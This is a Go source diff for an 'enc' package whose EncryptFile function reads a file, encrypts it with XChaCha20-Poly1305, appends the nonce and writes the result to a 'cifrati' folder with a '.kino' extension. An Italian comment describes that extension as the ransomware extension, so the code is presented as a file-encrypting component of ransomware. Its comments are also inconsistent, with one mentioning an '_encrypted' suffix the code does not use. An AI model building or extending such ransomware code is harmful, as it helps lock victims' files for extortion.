@@ -2,10 +2,11 @@ package enc
 
 import (
 	"crypto/rand"
-	"io"
+	"encoding/hex"
+	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
-	"strings"
 
 	"golang.org/x/crypto/chacha20poly1305"
 )
@@ -15,15 +16,20 @@ func EncryptFile(path string, name string, key []byte) error {
 	// - 1 leggere il file
 	// - 2 cifrarlo con un nonce differente
 	// - 3 crea la cartella se non esiste
-	// - 4 salvare il file cifrato con il nome originale + .kino
+	// - 4 salvare il file cifrato con il nome + estensione ransomware
+	// 	   e aggiunta il nonce alla fine del file
 	// note: utilizziamo xchacha20poly1305
-	inputFile, err := os.Open(path)
+	f, err := os.Open(path)
 	if err != nil {
 		log.Fatal(err)
 		return err
 	}
 
-	defer inputFile.Close()
+	fmt.Println(f, "encrypt	file")
+	plainText, err := ioutil.ReadAll(f)
+	if err != nil {
+		return err
+	}
 
 	nonce := make([]byte, chacha20poly1305.NonceSizeX)
 	if _, err := rand.Read(nonce); err != nil {
@@ -31,59 +37,30 @@ func EncryptFile(path string, name string, key []byte) error {
 		return err
 	}
 
+	// mostra nonce come stringa
+	nonceStr := hex.EncodeToString(nonce)
+	fmt.Println("Nonce:", nonceStr)
+
 	// crea la cartella se non esiste
 	if _, err := os.Stat("./cifrati"); os.IsNotExist(err) {
 		os.Mkdir("./cifrati", 0755)
 	}
 
-	noExtName := strings.Split(name, ".")[0]
-
-	uCantCMeFile, err := os.OpenFile("./cifrati/"+noExtName+".kino", os.O_RDWR|os.O_CREATE, 0666)
+	cipher, err := chacha20poly1305.NewX(key)
 	if err != nil {
-		log.Fatal(err)
 		return err
 	}
 
-	defer uCantCMeFile.Close()
+	// Encrypt the plaintext with the cipher
+	ciphertext := cipher.Seal(nil, nonce, plainText, nil)
 
-	if _, err := uCantCMeFile.Write(nonce); err != nil {
-		log.Fatal(err)
+	// Append the nonce to the encrypted data
+	encryptedData := append(ciphertext, nonce...)
+
+	// Write the encrypted data to a new file with "_encrypted" suffix added to the original filename
+	encryptedFilePath := "./cifrati/" + name + ".kino"
+	if err := ioutil.WriteFile(encryptedFilePath, encryptedData, 0644); err != nil {
 		return err
-	}
-
-	aead, err := chacha20poly1305.NewX(key)
-	if err != nil {
-		log.Fatal(err)
-		return err
-	}
-
-	buf := make([]byte, 1024*32)
-	ad_counter := 0
-
-	for {
-		// leggi il file
-		n, err := inputFile.Read(buf)
-
-		if n > 0 {
-			msg := buf[:n]
-			// cifra il file
-			ciphertext := aead.Seal(nil, nonce, msg, []byte(string(ad_counter)))
-			// scrivi il file cifrato
-			if _, err := uCantCMeFile.Write(ciphertext); err != nil {
-				log.Fatal(err)
-				return err
-			}
-
-			ad_counter++
-		}
-
-		if err == io.EOF {
-			break
-		}
-
-		if err != nil {
-			panic(err)
-		}
 	}
 
 	return nil
